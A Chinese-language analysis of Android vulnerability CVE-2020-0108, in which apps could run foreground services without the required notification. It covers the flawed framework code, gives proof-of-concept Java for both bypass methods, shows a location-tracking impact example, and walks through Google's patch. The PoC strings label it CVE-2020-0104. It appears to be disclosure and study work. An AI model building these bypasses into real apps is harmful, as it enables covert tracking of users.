# CVE-2020-0108 前台服务权限提升漏洞分析
## 一、漏洞背景
- 在AOSP的2020-08补丁中，披露了一个框架层AMS中的漏洞，编号为CVE-2020-0108，评级为High。AMS中对前台服务的处理中逻辑漏洞，成功利用该漏洞的攻击者可以绕过前台服务的通知显示并持续在后台运行。攻击需要由本地的恶意应用发起，不需要用户交互，如果用户授予了应用其它权限，可造成更大的危害，例如在持续追踪位置或静默录音等。

## 二、漏洞细节
- 前台服务是Google在Android 8.0中引入的概念，由于Android 8.0不允许后台启动后台服务，所以设计了前台服务的概念，前台服务优先级较高，可以长时间在后台运行，但是前台服务在启动后5秒必须绑定一个通知，否则会被杀死。实际上前台服务依旧是在“后台”运行的，只是由于绑定了用户可视的一个通知，所以Google称之为“前台服务”。
- 该漏洞用两种攻击方法，分别对应两个逻辑漏洞。
- 第一个漏洞是在NotificationManagerService中的onNotificationError方法，没有正确处理通知显示中的异常情况。
```java
// frameworks/base/services/core/java/com/android/server/notification/NotificationManagerService.java
@Override
public void onNotificationError(int callingUid, int callingPid, String pkg, String tag,
        int id, int uid, int initialPid, String message, int userId) {
        cancelNotification(callingUid, callingPid, pkg, tag, id, 0, 0, false, userId,
                REASON_ERROR, null);
}
```
- 在这种情况下，前台服务启动后，即使未能正确显示通知，也不会导致前台服务终止。比如说前台服务在创建通知时使用自定义的布局，在构建RemoteViews对象时，传入一个不存在的resID值，这样在NotificationManagerService解析通知的布局时，就会失败而抛出异常，并调用onNotificationError方法。由于onNotificationError方法中只是调用了cancelNotification方法来取消通知，而没有去终止服务或终止整个应用程序，这时候前台服务就会在不显示通知的情况下继续运行。
- 第二个漏洞是在ServiceRecord中postNotification方法中，没有正确处理通知显示中的异常情况，而是将异常抛出给了用户程序。
```java
// frameworks/base/services/core/java/com/android/server/am/ServiceRecord.java
public void postNotification() {
    final int appUid = appInfo.uid;
    final int appPid = app.pid;
    if (foregroundId != 0 && foregroundNoti != null) {
        //...
        ams.mHandler.post(new Runnable() {
            public void run() {
                //...
                try {
                    //...
                } catch (RuntimeException e) {
                    Slog.w(TAG, "Error showing notification for service", e);
                    // If it gave us a garbage notification, it doesn't
                        // get to be foreground.
                    ams.setServiceForeground(instanceName, ServiceRecord.this,
                            0, null, 0, 0);
                    ams.crashApplication(appUid, appPid, localPackageName, -1,
                            "Bad notification for startForeground: " + e);
                }
            }
        });
    }
}
```
- 在这种情况下，前台服务启动后，若用户程序捕获了主线程的异常，即使未能正确显示通知，也不会导致前台服务终止。比如说前台服务在创建通知时传入了不合法的Channel ID，这样在ServiceRecord的postNotification方法中发送通知时，就会抛出异常。在异常处理过程中，只是调用了AMS的crashApplication方法来向应用抛出一个主线程的异常，但是如果应用在主线程捕获了异常，则应用就不会崩溃，这时候前台服务就会在不显示通知的情况下继续运行。

## 三、漏洞验证
- 第一个漏洞，可以在前台服务中使用如下的代码触发
```java
NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
NotificationChannel notificationChannel = new NotificationChannel("c01", "CVE-2020-0104", NotificationManager.IMPORTANCE_DEFAULT);
notificationChannel.setDescription("Testing CVE-2020-0104");
notificationChannel.enableLights(true);
notificationChannel.setLightColor(Color.RED);
notificationChannel.enableVibration(true);
notificationChannel.setVibrationPattern(new long[]{100, 200, 300, 400, 500, 400, 300, 200, 100});
notificationManager.createNotificationChannel(notificationChannel);
//  Create a RemoteViews object with a invalid layout ID
RemoteViews remoteViews = new RemoteViews(getPackageName(), -1 /* A Invalid Layout ID */);
Notification notification = new NotificationCompat.Builder(this, "c01")
        .setContentTitle("Testing CVE-2020-0104")
        .setContentText("If you see this means you device is not vulnerable")
        .setCustomBigContentView(remoteViews)
        .setWhen(System.currentTimeMillis())
        .setSmallIcon(R.drawable.ic_launcher_foreground)
        .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_foreground))
        .build();
startForeground(1, notification);
```
- 我们在创建RemoteViews对象的时候，指定了Layout ID为-1，显然这是一个不合法的值，这样就可以触发onNotificationError回调。
- 第二个漏洞，可以在前台服务中使用如下的代码触发
```java
//   Handle the exception in main loop
new Handler(Looper.getMainLooper()).post(new Runnable() {
    @Override
    public void run() {
        while (true) {
            try {
                Looper.loop();
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }
    }
});
//   Create a Notification object with a invalid channel ID
Notification notification = new NotificationCompat.Builder(this, "InvalidInvalidInvalid" /* A Invalid Channel ID */)
        .setContentTitle("Testing CVE-2020-0104")
        .setContentText("If you see this means you device is not vulnerable")
        .setWhen(System.currentTimeMillis())
        .setSmallIcon(R.drawable.ic_launcher_foreground)
        .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_foreground))
        .build();
startForeground(2, notification);
```
- 这次我们直接没有创建NotificationChannel对象，直接使用了一个无效的Channel ID来构建Notification，这样就可以触发postNotification方法的异常，然后我们再捕获主线程的异常，这样应用就不会崩溃了。
## 四、漏洞影响
- 成功利用该漏洞，恶意应用可在后台静默拉起高优先级的前台服务并持续运行。
- 比较大的影响是应用利用定位权限对用户进行追踪，由于使用的是前台服务，所以即使是选择了“仅允许前台访问位置信息”，也可以在“后台”进行位置追踪，并且用户无感知。
```java
public void refreshLocation() {
    LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    String provider = LocationManager.GPS_PROVIDER;
    if (!checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
        return;
    }
    locationManager.requestLocationUpdates(provider, 2000, 10, new LocationListener() {
        @Override
        public void onLocationChanged(Location location) {
            double lat = location.getLatitude();
            double lng = location.getLongitude();
            Log.i(TAG, "Location Update: Latitude="+lat+",Longitude="+lng);
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {

        }

        @Override
        public void onProviderEnabled(String provider) {

        }

        @Override
        public void onProviderDisabled(String provider) {

        }
    });
}
```

## 五、漏洞补丁
- Google在2020-08补丁中修复了该漏洞，主要修改是在onNotificationError回调中强制使应用崩溃，并且在postNotification方法的异常处理中，也强制使应用崩溃，在crashApplication方法中，force=true的强制模式下，AMS会在抛出异常后的5秒内，强制杀死应用，即使应用捕获了异常也是如此。
- onNotificationError方法中调用crashApplication方法使得应用崩溃，并且force=true。
```java
// frameworks/base/services/core/java/com/android/server/notification/NotificationManagerService.java
@Override
public void onNotificationError(int callingUid, int callingPid, String pkg, String tag,
        int id, int uid, int initialPid, String message, int userId) {
    final boolean fgService;
    synchronized (mNotificationLock) {
        NotificationRecord r = findNotificationLocked(pkg, tag, id, userId);
        fgService = r != null && (r.getNotification().flags & FLAG_FOREGROUND_SERVICE) != 0;
    }
    cancelNotification(callingUid, callingPid, pkg, tag, id, 0, 0, false, userId,
            REASON_ERROR, null);
    if (fgService) {
        // Still crash for foreground services, preventing the not-crash behaviour abused
        // by apps to give us a garbage notification and silently start a fg service.
        Binder.withCleanCallingIdentity(
                () -> mAm.crashApplication(uid, initialPid, pkg, -1,
                    "Bad notification(tag=" + tag + ", id=" + id + ") posted from package "
                        + pkg + ", crashing app(uid=" + uid + ", pid=" + initialPid + "): "
                        + message, true /* force */));
    }
}
```
- postNotification方法的异常处理中调用killMisbehavingService方法杀死行为异常的服务
```java
// frameworks/base/services/core/java/com/android/server/am/ServiceRecord.java
} catch (RuntimeException e) {
    Slog.w(TAG, "Error showing notification for service", e);
    // If it gave us a garbage notification, it doesn't
    // get to be foreground.
    ams.mServices.killMisbehavingService(record,
            appUid, appPid, localPackageName);
}
```
- killMisbehavingService方法中除了加锁之外也是调用crashApplication方法
```java
// frameworks/base/services/core/java/com/android/server/am/ActiveServices.java
void killMisbehavingService(ServiceRecord r,
    int appUid, int appPid, String localPackageName) {
    synchronized (mAm) {
        stopServiceLocked(r);
        mAm.crashApplication(appUid, appPid, localPackageName, -1,
            "Bad notification for startForeground", true /*force*/);
    }
}
```
- 对于force=true的处理如下，抛出异常后的5秒内，强制杀死应用
```java
// frameworks/base/services/core/java/com/android/server/am/AppErrors.java
if (force) {
    // If the app is responsive, the scheduled crash will happen as expected
    // and then the delayed summary kill will be a no-op.
    final ProcessRecord p = proc;
    mService.mHandler.postDelayed(
            () -> killAppImmediateLocked(p, "forced", "killed for invalid state"),
            5000L);
}
```
